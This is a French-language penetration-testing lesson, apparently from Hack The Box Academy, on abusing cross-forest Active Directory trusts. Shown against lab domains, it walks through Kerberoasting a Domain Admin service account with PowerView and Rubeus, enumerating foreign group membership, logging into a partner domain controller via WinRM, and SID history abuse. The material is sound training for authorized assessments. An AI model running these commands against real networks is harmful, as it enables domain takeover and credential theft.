Attaquer les approbations de domaine - Abus d'approbation entre forêts - à partir de Windows
============================================================================================

* * * * *

Kerberoasting à travers la forêt
--------------------------------

Les attaques Kerberos telles que Kerberoasting et ASREPRoasting peuvent être effectuées entre les approbations, en fonction de la direction de l'approbation. Dans une situation où vous êtes positionné dans un domaine avec une approbation de domaine/forêt entrante ou bidirectionnelle, vous pouvez probablement effectuer diverses attaques pour prendre pied. Parfois, vous ne pouvez pas élever les privilèges dans votre domaine actuel, mais vous pouvez à la place obtenir un ticket Kerberos et déchiffrer un hachage pour un utilisateur administratif dans un autre domaine qui dispose des privilèges d'administrateur de domaine/d'entreprise dans les deux domaines.

Nous pouvons utiliser PowerView pour énumérer les comptes dans un domaine cible auxquels sont associés des SPN.

#### Énumération des comptes pour les SPN associés à l'aide de Get-DomainUser

  Attaquer les approbations de domaine - Abus d'approbation entre forêts - à partir de Windows

```
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc

```

Nous voyons qu'il existe un compte avec un SPN dans le domaine cible. Une vérification rapide montre que ce compte est membre du groupe Administrateurs de domaine dans le domaine cible, donc si nous pouvons le Kerberoast et déchiffrer le hachage hors ligne, nous aurions tous les droits d'administrateur sur le domaine cible.

#### Énumération du compte mssqlsvc

  Attaquer les approbations de domaine - Abus d'approbation entre forêts - à partir de Windows

```
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL

```

Effectuons une attaque Kerberoasting à travers la confiance en utilisant `Rubeus`. Nous exécutons l'outil comme nous l'avons fait dans la section Kerberoasting, mais nous incluons l' `/domain:`indicateur et spécifions le domaine cible.

#### Exécution d'une attaque Kerberoasting avec Rubeus à l'aide de l'indicateur /domain

  Attaquer les approbations de domaine - Abus d'approbation entre forêts - à partir de Windows

```
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>

```

Nous pourrions ensuite exécuter le hachage via Hashcat. Si cela échoue, nous avons rapidement étendu notre accès pour contrôler entièrement deux domaines en tirant parti d'une attaque assez standard et en abusant de la direction d'authentification et de la configuration de la confiance forestière bidirectionnelle.

* * * * *

Réutilisation du mot de passe administrateur et adhésion à un groupe
--------------------------------------------------------------------

De temps en temps, nous nous retrouverons dans une situation où il existe une fiducie forestière bidirectionnelle gérée par les administrateurs de la même entreprise. Si nous pouvons reprendre le domaine A et obtenir des mots de passe en texte clair ou des hachages NT pour le compte administrateur intégré (ou un compte qui fait partie du groupe Administrateurs d'entreprise ou Administrateurs de domaine dans le domaine A), et que le domaine B dispose d'un compte hautement privilégié avec le même nom, il vaut la peine de vérifier la réutilisation du mot de passe dans les deux forêts. J'ai parfois rencontré des problèmes où, par exemple, le domaine A avait un utilisateur nommé `adm_bob.smith`dans le groupe Administrateurs du domaine et le domaine B avait un utilisateur nommé `bsmith_admin`. Parfois, l'utilisateur utilisait le même mot de passe dans les deux domaines, et posséder le domaine A me donnait instantanément tous les droits d'administrateur sur le domaine B.

Nous pouvons également voir les utilisateurs ou les administrateurs du domaine A comme membres d'un groupe du domaine B. `Domain Local Groups`Autoriser uniquement les entités de sécurité extérieures à sa forêt. Nous pouvons voir un administrateur de domaine ou un administrateur d'entreprise du domaine A en tant que membre du groupe d'administrateurs intégré du domaine B dans une relation d'approbation de forêt bidirectionnelle. Si nous pouvons reprendre cet utilisateur administrateur dans le domaine A, nous obtiendrons un accès administratif complet au domaine B en fonction de l'appartenance au groupe.

Nous pouvons utiliser la fonction PowerView [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember) pour énumérer les groupes avec des utilisateurs qui n'appartiennent pas au domaine, également appelés `foreign group membership`. Essayons ceci avec le `FREIGHTLOGISTICS.LOCAL`domaine avec lequel nous avons une approbation forestière bidirectionnelle externe.

#### Utilisation de Get-DomainForeignGroupMember

  Attaquer les approbations de domaine - Abus d'approbation entre forêts - à partir de Windows

```
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator

```

Le résultat de la commande ci-dessus montre que le groupe Administrateurs intégré `FREIGHTLOGISTICS.LOCAL`possède le compte Administrateur intégré pour le `INLANEFREIGHT.LOCAL`domaine en tant que membre. Nous pouvons vérifier cet accès à l'aide de l' `Enter-PSSession`applet de commande pour nous connecter via WinRM.

#### Accès à DC03 à l'aide d'Enter-PSSession

  Attaquer les approbations de domaine - Abus d'approbation entre forêts - à partir de Windows

```
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL

```

À partir du résultat de la commande ci-dessus, nous pouvons voir que nous nous sommes authentifiés avec succès auprès du contrôleur de domaine du `FREIGHTLOGISTICS.LOCAL`domaine à l'aide du compte administrateur du `INLANEFREIGHT.LOCAL`domaine via l'approbation de forêt bidirectionnelle. Cela peut être une victoire rapide après avoir pris le contrôle d'un domaine et cela vaut toujours la peine de vérifier si une situation de confiance de forêt bidirectionnelle est présente lors d'une évaluation et si la deuxième forêt est dans le champ d'application.

* * * * *

Abus de l'histoire du SID - Cross Forest
----------------------------------------

L'historique SID peut également faire l'objet d'abus au sein d'une fiducie forestière. Si un utilisateur est migré d'une forêt vers une autre et que le filtrage SID n'est pas activé, il devient possible d'ajouter un SID de l'autre forêt, et ce SID sera ajouté au jeton de l'utilisateur lors de l'authentification via l'approbation. Si le SID d'un compte doté de privilèges administratifs dans la forêt A est ajouté à l'attribut d'historique SID d'un compte dans la forêt B, en supposant qu'il puisse s'authentifier dans la forêt, ce compte disposera de privilèges administratifs lors de l'accès aux ressources de la forêt partenaire. Dans le diagramme ci-dessous, nous pouvons voir un exemple d' `jjones`utilisateur migré du `INLANEFREIGHT.LOCAL`domaine vers le `CORP.LOCAL`domaine dans une forêt différente. Si le filtrage SID n'est pas activé lors de cette migration et que l'utilisateur dispose de privilèges administratifs (ou de tout type de droits intéressants tels que les entrées ACE, l'accès aux partages, etc.) dans le `INLANEFREIGHT.LOCAL`domaine, alors il conservera ses droits/accès administratifs dans `INLANEFREIGHT.LOCAL`tout en étant membre du nouveau domaine, `CORP.LOCAL`dans la deuxième forêt.

![image](https://academy.hackthebox.com/storage/modules/143/sid-history.png)

Cette attaque sera abordée en profondeur dans un module ultérieur axé davantage sur l'attaque des fiducies AD.

* * * * *

À partir de
-----------

Ensuite, nous passerons en revue quelques exemples d'attaques à travers une approbation de forêt à partir d'un hôte d'attaque Linux.
